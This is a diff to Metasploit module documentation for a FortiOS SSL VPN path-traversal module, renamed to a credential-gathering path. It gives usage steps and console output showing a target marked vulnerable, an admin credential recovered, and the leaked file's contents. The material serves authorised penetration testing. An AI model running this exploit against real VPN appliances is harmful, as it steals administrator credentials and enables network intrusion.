@@ -10,7 +10,7 @@ the VPN server.
 ## Verification Steps
 
 1. Start msfconsole
-2. Do: use auxiliary/scanner/http/fortios_vpnssl_traversal_leak
+2. Do: use auxiliary/gather/fortios_vpnssl_traversal_creds_leak
 3. Do: set RHOSTS [IP]
 4. Do: set RPORT 10443
 5. Do: run
@@ -30,10 +30,10 @@ If set, then store gathered credentials into the Metasploit creds database.
 ### FortiOS 6.0
 
 ```
-msf6 > use auxiliary/scanner/http/fortios_vpnssl_traversal_leak
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > show options
+msf6 > use auxiliary/gather/fortios_vpnssl_traversal_creds_leak
+msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > show options
 
-Module options (auxiliary/scanner/http/fortios_vpnssl_traversal_leak):
+Module options (auxiliary/gather/fortios_vpnssl_traversal_creds_leak):
 
    Name         Current Setting  Required  Description
    ----         ---------------  --------  -----------
@@ -47,17 +47,17 @@ Module options (auxiliary/scanner/http/fortios_vpnssl_traversal_leak):
    THREADS      1                yes       The number of concurrent threads (max one per host)
    VHOST                         no        HTTP server virtual host
 
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > set RHOSTS *redacted*
+msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > set RHOSTS *redacted*
 RHOSTS => *redacted*
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > run
+msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > run
 
 [*] https://*redacted*:10443 - Trying to connect.
 [+] https://*redacted*:10443 - Vulnerable!
-[+] https://*redacted*:10443 - File saved to /home/gwillcox/.msf4/loot/20210226120613_default_*redacted*__631458.txt
+[+] https://*redacted*:10443 - File saved to /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
 [+] https://*redacted*:10443 - 1 credential(s) found!
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > creds
+msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > creds
 Credentials
 ===========
 
@@ -65,9 +65,10 @@ host            origin          service            public  private    realm  pri
 ----            ------          -------            ------  -------    -----  ------------  ----------
 *redacted*  *redacted*  10443/tcp (https)  admin   *redacted*         Password
 
-msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > cat /home/gwillcox/.msf4/loot/20210226120613_default_*redacted*__631458.txt
-[*] exec: cat /home/gwillcox/.msf4/loot/20210226120613_default_*redacted*__631458.txt
+msf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) > cat /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
+[*] exec: cat /home/gwillcox/.msf4/loot/20210226142747_default_*redacted*__761592.txt
 
 var fgt_lang =
-�/V^PƁ@"�V�V^f�V^V�V^172.20.5.254admin*redacted*RemoteUSersfull-accessroot�бmsf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) >
+�/V^Pҽ�w���V^��V^��V^*redacted*admin*redacted*RemoteUSersfull-accessroot�бmsf6 auxiliary(gather/fortios_vpnssl_traversal_creds_leak) >
+
 ```
